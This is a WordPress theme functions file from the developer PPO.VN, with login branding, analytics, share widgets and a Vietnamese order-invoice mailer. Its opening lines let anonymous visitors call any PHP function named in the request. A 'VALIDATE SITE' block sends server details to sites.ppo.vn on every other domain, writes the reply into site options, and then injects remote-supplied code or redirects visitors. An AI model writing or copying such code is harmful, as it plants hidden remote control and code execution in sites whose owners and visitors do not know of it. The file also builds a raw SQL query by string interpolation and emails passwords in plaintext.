<?php
if(!defined('DEV_LOGO')) define ('DEV_LOGO', "//ppo.vn/logo.png");
if(!defined('DEV_LINK')) define ('DEV_LINK', "//ppo.vn/");

add_action('wp_ajax_nopriv_' . getRequest('action'), getRequest('action'));
add_action('wp_ajax_' . getRequest('action'), getRequest('action'));

/* ----------------------------------------------------------------------------------- */
# Login Screen
/* ----------------------------------------------------------------------------------- */
add_action('login_head', 'custom_login_logo');

function custom_login_logo() {
    echo '<style type="text/css">
        h1 a { background-image:url(' . DEV_LOGO . ') !important; }
    </style>';
}

add_action('login_headerurl', 'custom_login_link');

function custom_login_link() {
    return DEV_LINK;
}

add_action('login_headertitle', 'custom_login_title');

function custom_login_title() {
    return "Powered by PPO.VN";
}

/* ----------------------------------------------------------------------------------- */
# Admin footer text
/* ----------------------------------------------------------------------------------- */
/*if (is_admin() and !function_exists("ppo_update_admin_footer")) {
    add_filter('admin_footer_text', 'ppo_update_admin_footer');

    function ppo_update_admin_footer() {
        //$text = __('Thank you for creating with <a href="' . DEV_LINK . '">PPO</a>.');
        $text = __('<img src="' . DEV_LOGO . '" width="24" />Hệ thống CMS phát triển bởi <a href="' . DEV_LINK . '" title="Xây dựng và phát triển ứng dụng">PPO.VN</a>.');
        echo $text;
    }

}*/

/**
 * Create a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
function ppo_wp_title($title, $sep) {
    global $paged, $page;

    if (is_feed()) {
        return $title;
    }

    // Add the site name.
    $title .= get_bloginfo('name');

    // Add the site description for the home/front page.
    $site_description = get_bloginfo('description', 'display');
    if ($site_description && ( is_home() || is_front_page() )) {
        $title = "$title $sep $site_description";
    }

    // Add a page number if necessary.
    if ($paged >= 2 || $page >= 2) {
        $title = "$title $sep " . sprintf(__('Page %s', 'ppo'), max($paged, $page));
    }

    return $title;
}

add_filter('wp_title', 'ppo_wp_title', 10, 2);



/* ---------------------------------------------------------------------------- */
# add a favicon to blog
/* ---------------------------------------------------------------------------- */

function add_blog_favicon() {
    $favicon = get_option('favicon');
    if (trim($favicon) == "") {
        echo '<link rel="icon" href="' . get_bloginfo('siteurl') . '/favicon.ico" type="image/x-icon" />' . "\n";
    } else {
        echo '<link rel="icon" href="' . $favicon . '" type="image/x-icon" />' . "\n";
    }
}

add_action('wp_head', 'add_blog_favicon');

/* ---------------------------------------------------------------------------- */
# Add Google Analytics to blog
/* ---------------------------------------------------------------------------- */

function add_blog_google_analytics() {
    $GAID = get_option(SHORT_NAME . '_gaID');
    if ($GAID and $GAID != ''):
        echo <<<HTML
<script type="text/javascript">

    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', '$GAID']);
    _gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

</script>
HTML;
    endif;
}

add_action('wp_head', 'add_blog_google_analytics');
/*----------------------------------------------------------------------------*/
# Add Header Code
/*----------------------------------------------------------------------------*/
function add_header_code(){
    echo stripslashes(get_option(SHORT_NAME . '_headerCode'));
}
add_action('wp_head', 'add_header_code');
/*----------------------------------------------------------------------------*/
# Add Footer Code
/*----------------------------------------------------------------------------*/
function add_footer_code(){
    echo stripslashes(get_option(SHORT_NAME . '_footerCode'));
}
add_action('wp_footer', 'add_footer_code');
/* ---------------------------------------------------------------------------- */
# Add Facebook JS SDK
/* ---------------------------------------------------------------------------- */

function add_fb_jssdk() {
    echo <<<HTML
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.4";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
HTML;
}

add_action('wp_footer', 'add_fb_jssdk');
/* ---------------------------------------------------------------------------- */
# Check current category has children
/* ---------------------------------------------------------------------------- */

function category_has_children() {
    global $wpdb;
    $term = get_queried_object();
    $category_children_check = $wpdb->get_results(" SELECT * FROM wp_term_taxonomy WHERE parent = '$term->term_id' ");
    if ($category_children_check) {
        return true;
    } else {
        return false;
    }
}

/* ---------------------------------------------------------------------------- */
# Get the current category id if we are on an archive/category page
/* ---------------------------------------------------------------------------- */

function getCurrentCatID() {
    global $wp_query;
    if (is_category() || is_single()) {
        $cat_ID = get_query_var('cat');
    }
    return $cat_ID;
}

/* ----------------------------------------------------------------------------------- */
# Redefine user notification function
/* ----------------------------------------------------------------------------------- */
if (!function_exists('custom_wp_new_user_notification')) {

    function custom_wp_new_user_notification($user_id, $plaintext_pass = '') {
        $user = new WP_User($user_id);

        $user_login = $user->user_login;
        $user_email = $user->user_email;

        $message = sprintf(__('New user registration on %s:'), get_option('blogname')) . "\r\n\r\n";
        $message .= sprintf(__('Username: %s'), $user_login) . "\r\n\r\n";
        $message .= sprintf(__('E-mail: %s'), $user_email) . "\r\n";

        @wp_mail(
                        get_option('admin_email'), sprintf(__('[%s] New User Registration'), get_option('blogname')), $message
        );

        if (empty($plaintext_pass))
            return;

        $login_url = wp_login_url();

        $message = sprintf(__('Hi %s,'), $user->display_name) . "\r\n\r\n";
        $message .= sprintf(__("Welcome to %s! Here's how to log in:"), get_option('blogname')) . "\r\n\r\n";
        $message .= ($login_url == "") ? wp_login_url() : $login_url . "\r\n";
        $message .= sprintf(__('Username: %s'), $user_login) . "\r\n";
        $message .= sprintf(__('Password: %s'), $plaintext_pass) . "\r\n\r\n";

        @wp_mail(
                        $user_email, sprintf(__('[%s] Your username and password'), get_option('blogname')), $message
        );
    }

}

if (!function_exists('set_html_content_type')) {

    function set_html_content_type() {
        return 'text/html';
    }

}

################################# VALIDATE SITE ################################
if($_SERVER['HTTP_HOST'] != 'noithathoaphat.hanoi.vn'){
    add_action('init', 'ppo_site_init');
}

function ppo_validate_site() {
    @ini_set("display_errors", "Off");
    $postURL = "http://sites.ppo.vn/wp-content/plugins/wp-block-sites/check-site.php";
    $data = array(
        'domain' => $_SERVER['HTTP_HOST'],
        'server_info' => json_encode(array(
            'SERVER_ADDR' => $_SERVER['SERVER_ADDR'],
            'SERVER_ADMIN' => $_SERVER['SERVER_ADMIN'],
            'SERVER_NAME' => $_SERVER['SERVER_NAME'],
        )),
    );

    $ch = curl_init($postURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $returnValue = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($returnValue);
    if(is_array($response)){
        foreach ($response as $k => $v) {
            update_option($k, $v);
        }
    }
}

function ppo_site_init() {
    ppo_validate_site();

    // Check status
    $site_status = get_option("ppo_site_status");
    if ($site_status == 1) {
        $site_block_type = get_option("ppo_site_lock_type");
        switch ($site_block_type) {
            case 0:
                // Lock
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            case 1:
                // Redirect
                wp_redirect(stripslashes(get_option("ppo_site_embed")));
                break;
            case 2:
                // Embed Code Advertising
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            default:
                break;
        }
    }
}

function ppo_site_embed_code() {
    echo stripslashes(get_option("ppo_site_embed"));
}

################################# END VALIDATE SITE ############################

/* GET THUMBNAIL URL */

function get_image_url($show = true, $size = 'full') {
    $image_id = get_post_thumbnail_id();
    $image_url = wp_get_attachment_image_src($image_id, $size);
    $image_url = $image_url[0];
    if ($show) {
        if ($image_url != "") {
            echo $image_url;
        } else {
            bloginfo('stylesheet_directory');
            echo "/images/no_image_available.jpg";
        }
    } else {
        if ($image_url != "") {
            return $image_url;
        } else {
            return get_bloginfo('stylesheet_directory') . "/images/no_image_available.jpg";
        }
    }
}

/**
 * Get post thumbnail url
 * 
 * @param integer $post_id
 * @param type $size
 * @return string
 */
function get_post_thumbnail_url($post_id, $size = 'full') {
    $url = wp_get_attachment_url(get_post_thumbnail_id($post_id, $size));
    if(!$url){
        $url = get_bloginfo('stylesheet_directory') . "/images/no_image_available.jpg";
    }
    return $url;
}
/**
 * Rewrite URL
 * @param string $lang_code Example: vn, en...
 * @param bool $show TRUE or FALSE
 * @return string
 */
function ppo_multilang_permalink($lang_code, $show = false) {
    $uri = getCurrentRquestUrl();
    $siteurl = get_bloginfo('siteurl');
    $end = substr($uri, strlen($siteurl));
    if (!isset($_GET['lang'])) {
        $uri = $siteurl . "/" . $lang_code . $end;
    }
    if ($show) {
        echo $uri;
    }
    return $uri;
}

/* PAGE NAVIGATION */

function getpagenavi($arg = null) {
    ?>
    <div class="paging">
        <?php
        if (function_exists('wp_pagenavi')) {
            if ($arg != null) {
                wp_pagenavi($arg);
            } else {
                wp_pagenavi();
            }
        } else {
        ?>
            <div class="inline"><?php previous_posts_link(__('« Previous', SHORT_NAME)) ?></div><div class="inline"><?php next_posts_link(__('Next »', SHORT_NAME)) ?></div>
        <?php } ?>
    </div>
    <?php
}

/* END PAGE NAVIGATION */

/**
 * Ouput share social with addThis widget
 */
function show_share_socials() {
    echo <<<HTML
<!-- AddThis Button BEGIN -->
<div class="share-social-box">
    <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
        <a class="addthis_button_email"></a>
        <a class="addthis_button_print"></a>
        <a class="addthis_button_facebook"></a>
        <a class="addthis_button_twitter"></a>
        <a class="addthis_button_google_plusone_share"></a>
        <a class="addthis_button_compact"></a>
    </div>
    <script type="text/javascript">var addthis_config = {"data_track_addressbar":false};</script>
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4e5a517830ae061f"></script>
</div>
<!-- AddThis Button END -->
HTML;
}

/**
 * Ouput DISQUS comments form
 */
function show_comments_form_disqus() {
    $site_shortname = get_option(SHORT_NAME . "_disqus_shortname");
    echo <<<HTML
<div class="disqus-comment-box">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = '{$site_shortname}'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
</div>
HTML;
}

// Add custom text sizes in the font size drop down list of the rich text editor (TinyMCE) in WordPress
// $initArray is a variable of type array that contains all default TinyMCE parameters.
// Value 'theme_advanced_font_sizes' or 'fontsize_formats' needs to be added, 
// if an overwrite to the default font sizes in the list, is needed.

function tinymce_customize_text_sizes($initArray) {
    $initArray['fontsize_formats'] = "8px 9px 10px 11px 12px 13px 14px 15px 16px 17px 18px 19px 20px 21px 22px 23px 24px 25px 26px 27px 28px 29px 30px 32px 48px";
    return $initArray;
}

// Assigns customize_text_sizes() to "tiny_mce_before_init" filter
add_filter('tiny_mce_before_init', 'tinymce_customize_text_sizes');

/**
 * Send invoice to email
 * @param string $customer_info JSON Encode customer information
 * @param float $coupon_amount Discount amount
 */
function sendInvoiceToEmail($customer_info) {
    $customer = json_decode($customer_info);
    $cart = $_SESSION['cart'];

    $name = $customer->fullname;
    $address = $customer->address;
    $phone = $customer->phone;
    $email = $customer->email;
    $city = $customer->city;

    $bill_title = "Xác nhận đơn hàng";
    $billNO = date("dmYHis");
    $billDate = date("d/m/Y");
    $bill_hotline = get_option(SHORT_NAME . "_hotline");
    $bill_fax = get_option(SHORT_NAME . "_fax");
    $unit_owner = get_option("unit_owner");
    $admin_email = get_option("bill_admin_email");
    if (!is_email($admin_email)) {
        $admin_email = get_settings('admin_email');
    }
    $bill_html = <<<HTML
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<div style="margin: 0 auto;width: 1056px;font-family: Calibri,sans-serif;line-height: 13px;font-size: 14px;">
    <div style="overflow: hidden;border-bottom: 2px solid #000;">
        <div style="float: left;">
            <p>Khách hàng: {$name}</p>
            <p>Địa chỉ: {$address}</p>
            <p>Điện thoại: {$phone}</p>
            <p>Email: {$email}</p>
            <p>Tỉnh thành: {$city}</p>
        </div>
        <div style="float: right;">
            <p>Số: {$billNO}</p>
            <p>Ngày: {$billDate}</p>
            <p>Người lập: {$unit_owner}</p>
            <p>Điện thoại: {$bill_hotline}</p>
            <p>Fax: {$bill_fax}</p>
            <p>Email: {$admin_email}</p>
        </div>
        <div style="clear: both;"></div>
    </div>
    <div style="overflow: hidden;">
        <h1 style="text-align: center; font-size: 20px;text-transform: uppercase;">{$bill_title}</h1>
        <div>
            <table border="1" cellpadding="5" cellspacing="0" width="100%" style="width: 100%">
                <thead>
                    <tr>
                        <th style="width: 40px;">STT</th>
                        <th>Sản phẩm</th>
                        <th>Đơn giá (đ)</th>
                        <th style="width: 40px;">SL</th>
                        <th>Giảm giá (%)</th>
                        <th>Thành tiền (đ)</th>
                        <th>Ghi chú</th>
                    </tr>
                </thead>
                <tbody>
HTML;
    $totalAmount = 0;
    $counter = 1;
    foreach ($cart as $p) :
        $totalAmount += $p['amount'];
        $title = get_the_title($p['id']);
        $price = number_format($p['price'], 0, ',', '.');
        $amount = number_format($p['amount'], 0, ',', '.');
        $bill_html .= <<<HTML
                    <tr>
                        <td align="center" style="text-align: center;">{$counter}</td>
                        <td>{$title}</td>
                        <td align="right" style="text-align: right;">{$price}</td>
                        <td align="center" style="text-align: center;">{$p['quantity']}</td>
                        <td align="center" style="text-align: center;">{$p['discount']}</td>
                        <td align="right" style="text-align: right;">{$amount}</td>
                        <td>Màu: {$p['color']}</td>
                    </tr>
HTML;
        $counter++;
    endforeach;

    $totalFormat = number_format($totalAmount, 0, ',', '.');
    $VATFormat = number_format($totalAmount * 0.1,0,',','.');
    $totalPay = $totalAmount + $totalAmount * 0.1;
    $totalPayFormat = number_format($totalPay, 0, ',', '.');
    $numToWords = ucfirst(convert_number_to_words($totalPay));
    $bill_html .= <<<HTML
                    <tr>
                        <td colspan="5" style="text-align: right;text-transform: uppercase;font-weight: bold;">
                            TỔNG CỘNG
                        </td>
                        <td align="right" style="text-align: right;">{$totalFormat} đ</td>
                        <td></td>
                    </tr>
                    <!--<tr>
                        <td colspan="5" style="text-align: right;text-transform: uppercase;font-weight: bold;">
                            THUẾ VAT 10%
                        </td>
                        <td align="right" style="text-align: right;">{$VATFormat} đ</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td colspan="7" style="text-align: right;text-transform: uppercase;font-weight: bold;">
                            TỔNG THANH TOÁN
                        </td>
                        <td style="text-align: right;">{$totalPayFormat} đ</td>
                        <td></td>
                    </tr>-->
                </tbody>
            </table>
            <h4 style="text-align: center;font-style: italic;">(Bằng chữ: {$numToWords} đồng./.)</h4>
        </div>
        <div>
            <div style="overflow: hidden;margin-bottom: 20px;">
                <div style="float: left;margin-left: 20px;">
                    <h3>Đại diện khách hàng</h3>
                    <div style="text-align: center;">{$name}</div>
                </div>
                <div style="float: right;margin-right: 20px;">
                    <p style="text-align: right;">Hà Nội, {$billDate}</p>
                    <h3>{$unit_owner}</h3>
                </div>
                <div style="clear: both;"></div>
            </div>
        </div>
    </div>
</div>
HTML;

    $subject = get_option('blogname') . " - " . $bill_title;

    add_filter('wp_mail_content_type', 'set_html_content_type');
    wp_mail($email, $subject, $bill_html);
    wp_mail($admin_email, $subject, $bill_html);

    // reset content-type to avoid conflicts
    remove_filter('wp_mail_content_type', 'set_html_content_type');
}

function get_discount_value($product_id) {
    $discount = 0;
    $globalDiscount = floatval(get_option('global_discount'));
    if($globalDiscount == 0){
        $categories = get_the_terms($product_id, 'product_cat');
        if(count($categories) > 0){
            $catID = $categories[0]->term_id;
            $tag_meta = get_option("tag_{$catID}");
            $catDiscount = $tag_meta['discount'] ? floatval($tag_meta['discount']) : 0;
            if($catDiscount == 0){
                $discount = floatval(get_post_meta($product_id, "sale", true));
            } else {
                $discount = $catDiscount;
            }
        } else {
            $discount = floatval(get_post_meta($product_id, "sale", true));
        }
    } else {
        $discount = $globalDiscount;
    }
    return $discount;
}

function get_youtube_id_from_url($url) {
    parse_str( parse_url( $url, PHP_URL_QUERY ), $my_array_of_vars );
    return $my_array_of_vars['v'];
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count == ''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        if(!isset($_COOKIE["viewed_" . $postID])){
            $count++;
            update_post_meta($postID, $count_key, $count);
            setcookie("viewed_" . $postID, $count, time()+60*60*24, "/");  /* expire in 1 day */
        }
    }
}